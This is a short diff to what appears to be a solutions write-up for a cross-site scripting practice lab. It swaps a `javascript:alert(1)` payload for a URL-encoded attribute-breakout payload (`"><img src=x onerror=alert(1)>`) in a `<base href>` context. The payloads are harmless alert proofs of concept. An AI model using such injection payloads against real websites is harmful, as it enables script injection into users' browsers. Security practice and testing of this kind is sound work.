@@ -32,10 +32,10 @@ Reflections inside link-style URL/href attributes; many allow `javascript:` dire
 
 ### linkcontext-level5
 
-`/linkcontext/level5/?query=javascript:alert(1)`
+`/linkcontext/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: `<base href="...">` — relative links resolve against javascript: scheme
+- payload: `"><img src=x onerror=alert(1)>`
+- context: `<base href="...">`; javascript: base is ignored, so break out
 
 ### linkcontext-level6
 
